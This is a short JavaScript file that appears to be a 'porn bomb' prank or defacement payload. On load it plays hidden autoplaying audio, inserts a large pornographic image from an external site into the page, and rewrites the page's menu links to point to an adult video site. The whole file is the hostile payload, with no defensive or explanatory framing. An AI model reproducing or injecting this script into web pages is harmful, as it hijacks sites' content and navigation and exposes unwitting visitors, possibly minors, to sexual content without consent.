function porn(url){
    var pic = document.createElement('img');
    pic.src = url;
    pic.width = 1024;
    pic.height = 755;
    document.body.appendChild(pic);
}

function redriect(url){
    var a = document.getElementsByClassName('menu');
    var b = 0;
    while(b < 6){
        a[b].href = url;
        b++;
    }
}

function playSound(url){
    var audio = document.createElement('audio');
    audio.style.display = "none";
    audio.src = url;
    audio.autoplay = true;
    document.body.appendChild(audio);
}

function start(){
    playSound("https://raw.githubusercontent.com/NE1W01F/the-furry-porn-bomb/master/Amazon.mp3");
    porn("https://cdnio.luscious.net/987/lusciousnet_000000top1_855317720.jpg");
    redriect("https://www.thumbzilla.com/video/embed?key=ph59b436f94f7d0");
}

start();
